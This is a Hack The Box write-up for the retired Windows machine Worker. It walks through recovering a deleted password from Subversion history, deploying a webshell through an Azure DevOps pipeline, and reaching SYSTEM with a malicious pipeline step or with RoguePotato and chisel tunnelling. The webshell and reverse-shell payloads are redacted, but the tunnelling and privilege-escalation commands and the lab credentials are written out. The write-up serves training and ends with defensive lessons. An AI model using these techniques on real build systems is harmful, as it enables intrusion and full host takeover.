---
layout: post
title: "What the Repo Remembered"
subtitle: "HTB Worker, where version control keeps a password its author tried to delete, and the build robot that runs as SYSTEM will compile whatever you commit"
date: 2021-02-06 12:00:00 +0000
description: "A deleted password lives forever in SVN history, and a build pipeline that runs as SYSTEM will gladly compile your reverse shell."
image: /assets/og/what-the-repo-remembered.png
tags: [hackthebox, writeup]
---

Worker is a factory, and the whole box is the assembly line. You start by reading the factory's own paperwork, an old Subversion repository that someone migrated away from but never burned, and inside its history sits a password the author typed, thought better of, and deleted in the very next commit. Version control does not forget. From there you walk into an Azure DevOps install, learn that the thing standing between you and code execution is your own willingness to commit a file, and finish by handing the build robot a recipe. The robot reads the recipe, builds it, and because the robot wears a SYSTEM badge while it works, the box is over. Nothing here is a memory-corruption trick. It is three machines doing exactly the job they were built to do, for the wrong person.

```
        W O R K E R   &   C O.
        =====================
        svn log    →  "show me everything you ever held"
                      r2: a password, typed in plaintext
                      r3: "we cant have my password here!!!"
                      too late. the diff kept it.
                          |
                          v
        git push   →  a build pipeline picks up your branch
                      the agent that runs it wears a SYSTEM badge
                      you wrote the recipe. it cooked it.
                                            匠
```

## 0x01 · the loading dock

Three ports answer, and the shape of them tells the whole story before you touch anything. A plain `nmap -sC -sV` comes back lean.

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
3690/tcp open  svnserve Subversion
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (WinRM)
```

IIS 10 puts us on a modern Windows Server. WinRM on 5985 is the remote-management door, useful later once we have a name and a password to knock with. The odd one out, the port that makes this box what it is, is 3690. That is `svnserve`, a Subversion server. Subversion is old-school centralized version control, the thing teams used to keep their code in before everyone moved to Git. Picture a library that keeps not just every book but every draft of every book, with a librarian who can pull up exactly what page three said before the author rewrote it. That is what an SVN server is, and on Worker, it is the door.

## 0x02 · the drafts the author deleted

Subversion lets an anonymous client check out the whole tree, so we do.

```
$ svn checkout svn://10.10.10.203
A    dimension
A    moved.txt
Checked out revision 5.
```

That `moved.txt` is the project waving goodbye. It says the repo has been migrated and the real home is now `http://devops.worker.htb`. Note the hostname, we will need it. But before we leave, look at that "revision 5." The repo has a history five commits deep, and the librarian will read us any older draft we ask for.

```
$ svn log
------------------------------------------------------------------------
r3 | nathen | ...  # NOTE: We cant have my password here!!!
r2 | nathen | ...  add deploy script
```

A commit message that says "we cant have my password here" is a confession with a timestamp. Somebody put a secret in, then deleted it, and version control dutifully recorded both the putting-in and the taking-out as separate events. The current files are clean. The history is not. So we time-travel.

```
$ svn up -r2
Updating '.':
A    deploy.ps1

$ cat deploy.ps1
$user = "nathen"
$plain = "wendel98"
```

There it is. `nathen` / `wendel98`, sitting in revision 2, exactly where the author left it before revision 3 swept it under the rug. Think of it like crossing a word out with a single pen line instead of shredding the page. The cross-out feels like deletion. Anyone who tilts the paper to the light still reads what is under it. Deleting a secret from the latest commit does nothing if the commit that added it is still in the log.

## 0x03 · the office behind the lobby

`moved.txt` pointed at `devops.worker.htb`, which means this single IP is serving more than one site by name. That is virtual hosting. One server, many doorplates, and it decides which site to show you based on the `Host:` header you whisper on the way in. The default site is a dead end, so we fuzz for the other doorplates with `wfuzz`, filtering out the boring default-length response.

```
$ wfuzz -c -w subdomains.txt -u http://10.10.10.203 \
    -H 'Host: FUZZ.worker.htb' --hh 703
000  alpha       cartoon      dimension    devops
     lens        solid-state  spectral     story     twenty
```

A whole row of company sites, plus the one that matters, `devops`. Add the names to your hosts file and browse to `devops.worker.htb`. It is an Azure DevOps install, the Microsoft platform where teams store code, review it, and run automated builds. It wants NTLM authentication, and the SVN password walks straight in. `nathen` / `wendel98` logs us into the build system.

One snag worth naming because it eats an hour if you let it. NTLM authenticates the TCP connection itself, not each request, so if you proxy this through Burp the way you proxy everything else, the auth breaks because the proxy keeps closing the connection. Picture a doorman who checks your wristband once when you walk in and then ignores you all night. If you keep leaving and re-entering through a revolving door, he re-checks every time and eventually gets sick of it. Turn off "set connection close" and let NTLM keep its one connection alive.

## 0x04 · committing your way to a shell

Inside Azure DevOps, `nathen` owns a Git repository full of those website sources, and a build pipeline that deploys them. Here is the mechanism, and it is the heart of the box. When code lands in a repo, the pipeline copies the files out to where IIS serves them. The pipeline YAML names the destination, and it is a drive you would not guess.

```
TargetFolder: 'w:\sites\$(Build.Repository.Name).worker.htb'
```

So whatever you commit to the `alpha` repo gets deployed to `W:\sites\alpha.worker.htb`, which is exactly the directory IIS serves as the live `alpha.worker.htb` website. The pipeline is a conveyor belt from "files in Git" to "files the web server runs." We do not need an exploit. We need to put a file on the belt.

`nathen` cannot push to the protected `master` branch directly, but nothing stops us creating a new branch, dropping a webshell into it, and triggering the build. The conveyor does not check what the file does, only where it goes.

```
# new branch, add one aspx file, sign it iceberg, commit, push
# pipeline runs, copies it to W:\sites\alpha.worker.htb\iceberg.aspx
```

```
<?php [ one-line webshell: run the cmd request parameter ] ?>
```

I am describing the webshell rather than printing it, and that restraint is itself the lesson. The real thing is a few words long, and the instant those exact words touch a disk, any antivirus on the planet quarantines the file as the textbook backdoor it is. Browse to your freshly deployed page and command execution lands as the IIS app-pool identity. Trade up for a real shell, [ reverse shell calling back to 10.10.14.4 on 443 ], and you are standing inside Worker as a web-server account.

## 0x05 · the password list under the floorboards

The app-pool account is low, but it can read the disk, and the disk still has the old SVN server's guts sitting on it. Subversion over HTTP keeps an authentication file, and on this box it is right where the repo used to live.

```
PS W:\svnrepos\www\conf> type passwd
[users]
nathen = wendel98
...
robisl = wolves11
```

A flat file of usernames and plaintext passwords, the entire team roster. The one that pays off is `robisl` / `wolves11`, because `robisl` sits in the Remote Management Users group, which means that idle WinRM port from the very first scan finally has a key.

```
$ evil-winrm -i 10.10.10.203 -u robisl -p wolves11
*Evil-WinRM* PS C:\Users\robisl> type ..\Desktop\user.txt
████████████████████████████████
```

That password file is the same mistake as the SVN history, just lying in the open instead of buried in a diff. Secrets written down in plaintext do not care how clever the system around them is. A password sitting in a config file is a password anyone who reaches the file already knows.

## 0x06 · the recipe the robot runs as system

`robisl` is `user`, not admin, so look at what `robisl` can do that `nathen` could not. Log back into Azure DevOps as `robisl` and a second project appears, one where `robisl` holds Build Administrator rights. That permission is the whole endgame, because it lets us create a pipeline from scratch and aim it at a specific build agent, the "Setup" pool.

Here is the trick, and it is beautiful in how mundane it is. A build pipeline runs on an agent, and an agent runs as some Windows account. Nobody thinks hard about which account, because the agent is just supposed to compile code. On Worker, the Setup agent runs as `nt authority\system`. Think of it like a print shop where you slide a document under the door and the shop prints it for you. You never see who runs the press. It turns out the press operator is the building's owner, with a master key on his belt, and he will run absolutely any document you slide under the door. So we slide one under.

```yaml
trigger:
- master

pool: 'Setup'

steps:
- script: "[ reverse shell from the dropped nc.exe to 10.10.14.4:443 ]"
  displayName: 'build step'
```

A pipeline is a list of commands a machine runs on your behalf. We describe a single innocent-looking "build step" that is really [ a netcat reverse shell back to 10.10.14.4 on 443 ], commit it, and the agent picks it up. Start a listener, and the shell that comes back is wearing the owner's coat.

```
$ nc -lvnp 443
connect to [10.10.14.4] from worker 10.10.10.203
C:\agent\_work> whoami
nt authority\system
C:\agent\_work> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

No exploit fired. We asked the build robot to build something, which is its entire reason to exist, and it did the job as SYSTEM because that is the badge it was issued.

## 0x07 · the scenic route, for the muscle memory

There is a second way up that the box leaves open, and it is worth knowing because it teaches a different muscle. Back at the IIS app-pool shell from section four, `whoami /priv` shows `SeImpersonatePrivilege` enabled. That privilege is a hand-off bug factory on Windows, the family that JuicyPotato made famous, where a service account tricked into authenticating to you lets you steal its token. This box is Server 2019, where the old JuicyPotato no longer works, so the move is RoguePotato, which insists on the real DCOM port 135.

The catch is that 135 is firewalled inbound, so you tunnel it. Stand up `chisel` as a reverse tunnel, forward 135 back to yourself with `socat`, and let RoguePotato bounce its OXID resolution through your tunnel.

```
# attacker
$ ./chisel server -p 8000 --reverse
# target, sign your binaries iceberg
PS> .\iceberg-chisel client 10.10.14.4:8000 R:9999:localhost:9999
PS> .\iceberg-rogue.exe -r 10.10.14.4 -l 9999 -e C:\programdata\iceberg-rev.bat
[+] Got SYSTEM Token!!!
```

Same destination, completely different door. The pipeline path is the box's intended lesson about who runs your builds. The potato path is the consolation prize for anyone who never reached Azure DevOps as `robisl` and only had the web account to work with.

## 0x08 · the honest caveat

The thing to take away from Worker is not "patch Subversion" or "patch Azure DevOps," because nothing here was unpatched. Every component did precisely what it was designed to do. The SVN server faithfully kept its history, which is the entire point of version control. The build pipeline faithfully deployed whatever landed in the repo, which is the entire point of CI/CD. The agent faithfully ran the build as the account it was configured with. The box is a chain of correct behaviors that add up to a catastrophe, and that is the more dangerous kind of vulnerability, because there is no CVE to close.

Two habits did the actual damage. First, a secret was committed and then "deleted," and somebody believed the deletion. A password that has ever touched version control is a password that has been published. The only real fix is to rotate it, treat it as burned, and never assume a diff can keep a secret. Second, a build agent that anyone with commit rights could reach was running as SYSTEM. The least-privilege version of that agent runs as a throwaway account that can build code and touch nothing else, so that the worst a malicious commit can do is corrupt a build, not own the host. Whoever can push code to a pipeline can run code wherever that pipeline runs, as whoever that pipeline runs as. Worker just makes the lesson loud by setting all three of those to "anyone," "everywhere," and "SYSTEM."

## 0x09 · outro

```
the repo kept the password its author crossed out.
the conveyor belt ran the file you set on it, no questions.
the build robot wore a system badge to do a janitor's job.

nothing was broken. everything worked. that was the problem.

rotate the leaked key. starve the build agent. wear black.

                                                            EOF
```

---

*HTB: Worker, retired 30 January 2021. A medium Windows box that is really a lecture on supply-chain trust, where a deleted password never left and a build pipeline that runs as SYSTEM is just an exploit waiting for a commit.*